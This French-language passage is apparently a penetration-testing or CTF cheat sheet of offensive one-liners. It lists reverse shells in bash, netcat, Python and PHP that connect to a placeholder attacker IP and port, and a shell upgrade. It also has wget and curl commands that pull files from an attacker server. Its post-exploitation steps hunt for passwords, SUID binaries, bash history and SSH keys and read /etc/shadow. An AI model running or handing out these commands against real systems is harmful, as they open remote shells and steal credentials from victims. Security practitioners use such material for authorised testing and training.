### Bash (URL encoded)
`bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/YOUR_PORT+0>%261'`

### Netcat (si -e autorisé)
`nc YOUR_IP YOUR_PORT -e /bin/bash`

### Python reverse shell
`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",YOUR_PORT));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/bash")'`

### PHP reverse shell minimal
`php -r '$sock=fsockopen("YOUR_IP",YOUR_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`

---

## Upgrade de shell (TTY)

### Python
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

### Ctrl-Z + stty
`Ctrl+Z`
`stty raw -echo; fg`
`reset`
`export TERM=xterm`

---

## Téléchargement rapide de fichiers

### wget
`wget http://YOUR_IP/file.sh`

### curl
`curl http://YOUR_IP/file.sh -o file.sh`

### Python HTTP server (attaquant)
`python3 -m http.server 8000`

---

## Encodage / décodage rapide

### Base64
`echo "test" | base64`
`echo "dGVzdA==" | base64 -d`

### URL encode
`python3 -c 'import urllib.parse; print(urllib.parse.quote("test"))'`

---

## Recherche express

### Fichier contenant une chaîne
`grep -R "password" / 2>/dev/null`

### Permissions SUID
`find / -perm -4000 -type f 2>/dev/null`

### Fichiers modifiés récemment
`find / -mtime -1 2>/dev/null`

---

## Ports & réseau

### IP locale
`ip a`

### Routes
`ip route`

### Ports en écoute
`ss -lntp`

---

## Historique & creds

### Historique bash
`cat ~/.bash_history`

### SSH keys
`ls ~/.ssh/`

### Fichiers intéressants
`cat /etc/passwd`
`cat /etc/shadow`

